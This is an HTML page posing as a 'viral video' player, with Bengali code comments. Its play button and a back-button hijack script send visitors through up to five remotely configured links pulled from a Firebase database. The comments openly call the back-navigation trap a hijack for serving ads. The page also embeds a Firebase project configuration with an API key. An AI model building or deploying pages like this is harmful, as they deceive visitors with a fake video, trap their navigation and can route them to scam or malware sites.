<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Viral video – Play now</title>

<!-- Firebase JS SDK -->
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

<!-- মাস্টার স্ক্রিপ্ট – পেজ লোড হওয়ার আগেই ব্যাক বাটন হাইজ্যাক করবে -->
<script>
    // ক্রস-ব্রাউজার ব্যাক ডিটেকশন – Performance API ব্যবহার করে
    function isBackNavigation() {
        const perfEntries = performance.getEntriesByType('navigation');
        if (perfEntries.length > 0) {
            const navType = perfEntries[0].type;
            return navType === 'back_forward' || navType === 'reload'; // রিলোডও কভার করা হলো
        }
        return false;
    }

    function instantRedirectHijack() {
        let count = parseInt(sessionStorage.getItem('redirectCount')) || 0;
        let linksData = sessionStorage.getItem('targetLinks');
        let hijackActive = sessionStorage.getItem('hijackActive');

        // হাইজ্যাক তখনই করবে যখন অ্যাক্টিভ সেশন আছে, কাউন্ট ১-৪ এর মধ্যে, এবং লিংক ডাটা আছে
        if (hijackActive === 'yes' && count > 0 && count < 5 && linksData) {
            let targetLinks = JSON.parse(linksData);
            let nextLink = targetLinks[count] || "https://google.com";

            // কাউন্ট বাড়িয়ে দাও পরবর্তী জন্য
            sessionStorage.setItem('redirectCount', count + 1);

            // href ব্যবহার করো (replace না) – যাতে ভিডিও পেজ হিস্ট্রিতে থাকে
            window.location.href = nextLink;
        }
    }

    // নির্ভরযোগ্য ব্যাক ডিটেকশন – pageshow + persisted প্রপার্টি
    window.addEventListener('pageshow', function(event) {
        // যদি পেজ BFCache থেকে লোড হয় (persisted) অথবা ব্যাক/ফরওয়ার্ড নেভিগেশন হয়
        if (event.persisted || isBackNavigation()) {
            instantRedirectHijack();
        }
    });

    // পুরনো ব্রাউজারদের জন্য ফallback – যারা Performance API সাপোর্ট করে না
    window.addEventListener('load', function() {
        if (sessionStorage.getItem('hijackActive') === 'yes' && 
            parseInt(sessionStorage.getItem('redirectCount')) > 0) {
            setTimeout(instantRedirectHijack, 100);
        }
    });
</script>

<style>
/* আগের মতই CSS */
body{ margin:0; background:black; font-family:Arial; color:white; }
.video {
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    position: relative;
    background-size: cover;
    background-position: center;
    background-image: url('https://images.unsplash.com/photo-1536440136628-849c177e76a1?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80'); 
}
.play {
    width: 120px; height: 120px; border-radius: 50%; border: 3px solid white;
    display: flex; justify-content: center; align-items: center;
    font-size: 50px; box-shadow: 0 0 30px white; cursor: pointer;
    background: rgba(0, 0, 0, 0.4); 
}
.controls {
    position: fixed; bottom: 0; width: 100%; padding: 10px; background: rgba(0,0,0,0.8);
}
.progress { height: 6px; background: #333; margin-bottom: 8px; }
.bar { width: 20%; height: 100%; background: white; }
.time { display: flex; justify-content: space-between; font-size: 14px; }
</style>
</head>
<body>

<div class="video" id="videoBg">
    <div class="play" onclick="openLink()">▶</div>
</div>

<div class="controls">
    <div class="progress"><div class="bar"></div></div>
    <div class="time"><span>0:11</span><span>8:32</span></div>
</div>

<script>
    // Firebase কনফিগ (আপনার দেওয়া)
    const firebaseConfig = {
        apiKey: "AIzaSyC2tguQFjkUvncBvn6-e7_Ux5vJ6lEzpjQ",
        authDomain: "vital-1f05b.firebaseapp.com",
        databaseURL: "https://vital-1f05b-default-rtdb.firebaseio.com",
        projectId: "vital-1f05b",
        storageBucket: "vital-1f05b.firebasestorage.app",
        messagingSenderId: "992463011532",
        appId: "1:992463011532:web:708ff147b8e7e1ce5b8c69"
    };

    if (!firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
    }
    const db = firebase.database();
    const maxRedirects = 5;

    // ফায়ারবেস থেকে ডাটা আনবে
    function fetchSettings() {
        db.ref('playerSettings').on('value', (snapshot) => {
            const data = snapshot.val();
            if (data) {
                if (data.bgImage && data.bgImage.trim() !== "") {
                    document.getElementById('videoBg').style.backgroundImage = `url('${data.bgImage}')`;
                }
                const links = [data.link1, data.link2, data.link3, data.link4, data.link5];
                sessionStorage.setItem('targetLinks', JSON.stringify(links));
            }
        });
    }

    // প্লে বাটনে ক্লিক
    function openLink() {
        let count = parseInt(sessionStorage.getItem('redirectCount')) || 0;
        let linksData = sessionStorage.getItem('targetLinks');
        
        if (!linksData) {
            alert("ডেটা লোড হচ্ছে, দয়া করে ২ সেকেন্ড অপেক্ষা করুন...");
            return;
        }

        let targetLinks = JSON.parse(linksData);
        // যদি ৫ বার শেষ হয়ে যায়
        if (count >= maxRedirects) {
            sessionStorage.removeItem('hijackActive');
            alert("৫টি এড শেষ! এখন অরিজিনাল ভিডিও প্লে হচ্ছে...");
            // এখানে ভিডিও চালানোর কোড দিন
            return;
        }

        // নতুন কাউন্ট = পুরনো কাউন্ট + ১
        let newCount = count + 1;
        sessionStorage.setItem('redirectCount', newCount);
        sessionStorage.setItem('hijackActive', 'yes');

        // বর্তমান কাউন্ট অনুযায়ী লিংক নাও (যেহেতু প্রথম ক্লিকে count=0, লিংক হবে targetLinks[0])
        let currentLink = targetLinks[count] || "https://google.com";

        setTimeout(() => {
            window.location.href = currentLink;
        }, 50);
    }

    fetchSettings();
</script>

</body>
</html>
